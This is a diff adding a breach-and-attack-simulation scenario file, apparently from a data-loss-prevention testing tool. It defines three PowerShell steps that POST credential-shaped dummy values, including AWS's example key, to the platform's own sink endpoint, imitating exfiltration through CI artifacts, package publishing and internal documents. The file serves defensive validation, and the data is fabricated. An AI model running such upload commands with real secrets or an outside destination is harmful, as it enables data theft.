@@ -1,0 +1,127 @@
+id: dlp-exfiltration-devtools
+name: DLP Exfiltration Validation — Developer Tooling Channels (Artifacts, Packages, Internal Docs)
+description: >
+  Attempts to move developer-side material out through three developer
+  tooling paths, each POSTed to the platform's own sink endpoint over HTTPS:
+  a CI/CD build artifact, a package publish that embeds a credential-shaped
+  value, and an internal design document shared through a developer tool.
+  This is the DLP-DEV scenario family from dlp.txt, covering source,
+  secrets, internal documents, developer tools and CI/CD artifacts.
+
+  Verdicts come from the same destination-side sink receipt as the other
+  sink-verified scenarios (see dlp-exfiltration-sink-https.yaml). Local
+  success is not treated as proof of exfiltration.
+
+  Scope limit: these are HTTPS uploads that imitate developer tooling. They
+  do not drive a real git client, npm, pip, docker or a real CI runner, so
+  they do not validate any vendor's developer-tool control. Repository pushes
+  over git's own protocol are not covered here.
+
+  Safety: all synthetic data is fabricated and tagged [BAS-SIM-DEV]. The
+  credential-shaped values are AWS's documented example key and an explicit
+  placeholder, never real credentials. The sink stores only a hash of the
+  payload, never the raw content. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - developer
+  - windows
+  - mitre-attack
+mitre_phases:
+  - collection
+  - exfiltration
+
+steps:
+  - name: "DLP Validation — CI/CD Build Artifact Upload via HTTPS Sink (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic CI/CD build artifact manifest to the platform's own sink endpoint over HTTPS. No real build, no real credentials, no external destination."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST of CI/CD artifact content carrying credential-shaped values"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DEV] AKIAIOSFODNN7EXAMPLE BAS-SIM-DEV-PRIVATE-KEY-PLACEHOLDER`nartifact=bas-sim-build.tar.gz`npipeline=bas-sim-ci`nstage=publish"
+      try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='ci-artifact-upload'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1567: CI/CD artifact manifest POSTed over HTTPS. [BAS-SIM-DEV-CI]"
+      } catch {
+        Write-Output "EXEC T1567: CI/CD artifact upload to sink was blocked or failed before completing. [BAS-SIM-DEV-CI]"
+      }
+      # No local DLP_OBSERVATION marker: the verdict comes from the sink receipt.
+    cleanup: ""
+
+  - name: "DLP Validation — Package Publish With Embedded Credential via HTTPS Sink (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic package manifest carrying a placeholder credential to the platform's own sink endpoint over HTTPS. Nothing is published to any registry."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST of a package manifest carrying a credential-shaped value"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DEV] AKIAIOSFODNN7EXAMPLE BAS-SIM-DEV-PRIVATE-KEY-PLACEHOLDER`npackage=bas-sim-pkg`nversion=0.0.0-sim`nregistry=sink"
+      try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='package-publish'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1567: package manifest with embedded credential POSTed over HTTPS. [BAS-SIM-DEV-PKG]"
+      } catch {
+        Write-Output "EXEC T1567: package publish to sink was blocked or failed before completing. [BAS-SIM-DEV-PKG]"
+      }
+      # No local DLP_OBSERVATION marker: the verdict comes from the sink receipt.
+    cleanup: ""
+
+  - name: "DLP Validation — Internal Design Document Shared Via Developer Tooling (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic internal design document, marked Confidential, to the platform's own sink endpoint over HTTPS. No real document, no external share."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST of a document labelled Confidential carrying credential-shaped values"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DEV] AKIAIOSFODNN7EXAMPLE BAS-SIM-DEV-PRIVATE-KEY-PLACEHOLDER`ndocument=bas-sim-design.md`nclassification=Confidential`nowner=bas-sim"
+      try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='devtool-doc-upload'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1567: internal design document POSTed over HTTPS via developer tooling. [BAS-SIM-DEV-DOC]"
+      } catch {
+        Write-Output "EXEC T1567: internal document upload to sink was blocked or failed before completing. [BAS-SIM-DEV-DOC]"
+      }
+      # No local DLP_OBSERVATION marker: the verdict comes from the sink receipt.
+    cleanup: ""
